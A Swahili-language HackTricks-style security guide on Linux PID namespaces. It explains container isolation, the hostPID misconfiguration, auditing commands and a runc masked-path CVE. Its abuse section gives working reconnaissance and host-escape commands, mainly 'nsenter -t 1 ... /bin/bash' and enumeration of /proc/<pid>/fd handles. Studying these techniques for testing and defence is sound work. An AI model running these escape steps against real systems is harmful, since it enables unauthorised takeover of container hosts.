# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Muhtasari

PID namespace hudhibiti jinsi processes zinavyopangiwa nambari na ni processes zipi zinazoonekana. Hii ndiyo sababu container inaweza kuwa na PID 1 yake hata kama si mashine halisi. Ndani ya namespace, workload huona kinachoonekana kama process tree ya ndani. Nje ya namespace, host bado huona PIDs halisi za host na mandhari kamili ya processes.

Kwa mtazamo wa security, PID namespace ni muhimu kwa sababu mwonekano wa processes una thamani. Mara workload inapoweza kuona processes za host, inaweza kuweza kuchunguza majina ya services, command-line arguments, secrets zilizopitishwa kwenye process arguments, hali inayotokana na environment kupitia `/proc`, na targets zinazoweza kutumiwa kuingia kwenye namespace. Ikiweza kufanya zaidi ya kuona tu hizo processes, kwa mfano kutuma signals au kutumia ptrace chini ya masharti yanayofaa, tatizo huwa kubwa zaidi.

## Uendeshaji

PID namespace mpya huanza na mpangilio wake wa ndani wa nambari za processes. Process ya kwanza inayoundwa ndani yake huwa PID 1 kwa mtazamo wa namespace hiyo, jambo ambalo pia humaanisha kwamba hupata semantics maalum zinazofanana na init kwa watoto yatima na tabia ya signals. Hii hufafanua mambo mengi yasiyo ya kawaida ya containers kuhusu init processes, zombie reaping, na kwa nini tiny init wrappers hutumiwa wakati mwingine kwenye containers.

Somo muhimu la security ni kwamba process inaweza kuonekana kuwa isolated kwa sababu huona PID tree yake pekee, lakini isolation hiyo inaweza kuondolewa kimakusudi. Docker hutoa hili kupitia `--pid=host`, huku Kubernetes ikifanya hivyo kupitia `hostPID: true`. Container inapojiunga na host PID namespace, workload huona processes za host moja kwa moja, na attack paths nyingi zinazofuata huwa halisi zaidi.

## Lab

Kuunda PID namespace manually:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Shell sasa inaona mwonekano wa faragha wa michakato. Bendera ya `--mount-proc` ni muhimu kwa sababu ina-mount instance ya procfs inayolingana na PID namespace mpya, hivyo orodha ya michakato huwa na mshikamano ukiwa ndani.

Ili kulinganisha tabia ya container:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Tofauti hiyo inaonekana mara moja na ni rahisi kuelewa, ndiyo maana hii ni labu nzuri ya kwanza kwa wasomaji.

## Matumizi ya Runtime

Containers za kawaida katika Docker, Podman, containerd, na CRI-O hupata PID namespace yao wenyewe. Kubernetes Pods kwa kawaida pia hupokea mtazamo wa PID uliotengwa isipokuwa workload iombe waziwazi kushiriki host PID. Mazingira ya LXC/Incus hutegemea primitive hiyo hiyo ya kernel, ingawa matumizi ya system-container yanaweza kufichua process trees zilizo ngumu zaidi na kuhimiza shortcuts zaidi za debugging.

Kanuni hiyo hiyo inatumika kila mahali: ikiwa runtime ilichagua kutotenga PID namespace, huo ni upunguzaji wa makusudi wa mpaka wa container.

## Mipangilio Isiyo Sahihi

Mipangilio isiyo sahihi ya kawaida ni kushiriki host PID. Timu mara nyingi huhalalisha hili kwa ajili ya debugging, monitoring, au urahisi wa service-management, lakini linapaswa daima kuchukuliwa kama security exception yenye umuhimu. Hata kama container haina write primitive ya haraka dhidi ya host processes, mwonekano pekee unaweza kufichua mengi kuhusu mfumo. Pindi capabilities kama `CAP_SYS_PTRACE` au procfs access yenye manufaa zinapoongezwa, risk huongezeka kwa kiasi kikubwa.

Kosa jingine ni kudhani kwamba kwa sababu workload haiwezi kwa default kuua au kutumia ptrace dhidi ya host processes, basi kushiriki host PID hakuna madhara. Hitimisho hilo linapuuza thamani ya enumeration, upatikanaji wa namespace-entry targets, na jinsi mwonekano wa PID unavyochanganyika na controls nyingine zilizodhoofishwa.

## Matumizi Mabaya

Ikiwa host PID namespace inashirikiwa, attacker anaweza kukagua host processes, kukusanya process arguments, kutambua services zinazovutia, kupata candidate PIDs za `nsenter`, au kuchanganya mwonekano wa processes na privilege inayohusiana na ptrace ili kuingilia host au workloads za jirani. Katika baadhi ya hali, kuona tu process sahihi inayotumia muda mrefu kunatosha kubadilisha mpango uliobaki wa attack.

Hatua ya kwanza ya vitendo daima ni kuthibitisha kwamba host processes zinaonekana kweli:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Mara PID za host zinapoonekana, arguments za process na targets za kuingia kwenye namespace mara nyingi huwa chanzo muhimu zaidi cha taarifa:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Ikiwa `nsenter` inapatikana na kuna privileges za kutosha, jaribu ikiwa mchakato wa host unaoonekana unaweza kutumika kama namespace bridge:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Hata wakati kuingia kumezuiwa, kushiriki kwa PID za host bado kuna thamani kwa sababu hufichua mpangilio wa service, vipengele vya runtime, na michakato yenye privileges inayoweza kulengwa baadaye.

Mwonekano wa PID za host pia hufanya matumizi mabaya ya file descriptor yawe yenye uhalisia zaidi. Ikiwa process yenye privileges ya host au workload ya jirani ina faili au socket nyeti iliyofunguliwa, mshambuliaji anaweza kukagua `/proc/<pid>/fd/` na kutumia tena handle hiyo, kutegemea ownership, mount options za procfs, na model ya service inayolengwa.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Amri hizi ni muhimu kwa sababu zinajibu ikiwa `hidepid=1` au `hidepid=2` inapunguza mwonekano kati ya michakato na ikiwa descriptors zilizo wazi kuwa za kuvutia, kama vile faili za siri zilizofunguliwa, logs, au Unix sockets, zinaonekana kabisa.

### Mfano Kamili: host PID + `nsenter`

Kushirikisha host PID huwa direct host escape wakati mchakato pia una privilege ya kutosha kujiunga na namespaces za host:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Ikiwa amri itafaulu, mchakato wa container sasa unatekelezwa katika mount, UTS, network, IPC, na PID namespaces za host. Athari yake ni kuathiri host mara moja.

Hata wakati `nsenter` yenyewe haipo, matokeo hayo hayo yanaweza kupatikana kupitia binary ya host ikiwa filesystem ya host imewekwa:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Maelezo ya Hivi Karibuni ya Runtime

Baadhi ya mashambulizi yanayohusiana na PID-namespace si `hostPID: true` misconfigurations za kawaida, bali ni bugs za utekelezaji wa runtime zinazohusu jinsi ulinzi wa procfs unavyotumika wakati wa kusanidi container.

#### `maskedPaths` race hadi host procfs

Katika matoleo ya `runc` yaliyo hatarini, attackers wanaoweza kudhibiti container image au workload ya `runc exec` wanaweza kufanya race kwenye awamu ya masking kwa kubadilisha `/dev/null` iliyo upande wa container kuwa symlink inayoelekeza kwenye procfs path nyeti kama `/proc/sys/kernel/core_pattern`. Ikiwa race hiyo itafanikiwa, masked-path bind mount inaweza kuwekwa kwenye target isiyo sahihi na kufichua procfs knobs za host-global kwa container mpya.<sup>[[1]](#references)</sup>

Useful review command:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
This ni muhimu kwa sababu athari ya mwisho inaweza kuwa sawa na kufichuliwa moja kwa moja kwa procfs: `core_pattern` au `sysrq-trigger` inayoweza kuandikwa, ikifuatiwa na host code execution au denial of service.

#### Namespace injection with `insject`

Zana za Namespace injection kama vile `insject` zinaonyesha kwamba mwingiliano na PID-namespace hauhitaji kila mara kuingia kwenye namespace lengwa kabla ya kuunda process. Helper inaweza kuambatishwa baadaye, kutumia `setns()`, na kutekeleza huku ikiendelea kuhifadhi mwonekano wa nafasi ya PID lengwa:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Aina hii ya technique ni muhimu hasa kwa advanced debugging, offensive tooling, na post-exploitation workflows ambapo namespace context lazima iunganishwe baada ya runtime kuanzisha workload.

### Miundo Husika ya Matumizi Mabaya ya FD

Miundo miwili inafaa kutajwa wazi wakati host PIDs zinaonekana. Kwanza, process yenye privileges inaweza kuweka file descriptor nyeti ikiwa wazi wakati wa `execve()` kwa sababu haikuwekewa alama ya `O_CLOEXEC`. Pili, services zinaweza kupitisha file descriptors kupitia Unix sockets kwa kutumia `SCM_RIGHTS`. Katika hali zote mbili, object ya kuvutia si pathname tena, bali ni handle ambayo tayari imefunguliwa na ambayo process yenye privileges ndogo inaweza kurithi au kupokea.

Hili ni muhimu katika kazi za container kwa sababu handle inaweza kuelekeza kwenye `docker.sock`, log yenye privileges, secret file ya host, au object nyingine yenye thamani kubwa, hata wakati path yenyewe haifikiwi moja kwa moja kutoka kwenye container filesystem.

## Ukaguzi

Lengo la commands hizi ni kubaini ikiwa process ina private PID view au ikiwa tayari inaweza kuorodhesha mazingira mapana zaidi ya processes.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Kinachovutia hapa:

- Ikiwa orodha ya processes ina host services zilizo wazi, huenda host PID sharing tayari inatumika.
- Kuona tree ndogo ya container pekee ndiyo hali ya kawaida ya msingi; kuona `systemd`, `dockerd`, au daemons zisizohusiana si hali ya kawaida.
- Pindi host PIDs zinapoonekana, hata taarifa za processes za read-only huwa reconnaissance yenye manufaa.

Ukigundua container inayoendesha ikiwa na host PID sharing, usichukulie hili kama tofauti ya muonekano tu. Ni mabadiliko makubwa katika kile ambacho workload inaweza kuona na, kwa uwezekano, kuathiri.

## Marejeo

- [1] [Ushauri wa usalama wa runc: container escape kupitia matumizi mabaya ya "masked path" kutokana na mount race conditions (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Kutolewa kwa Tool – insject: Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)

{{#include ../../../../../banners/hacktricks-training.md}}
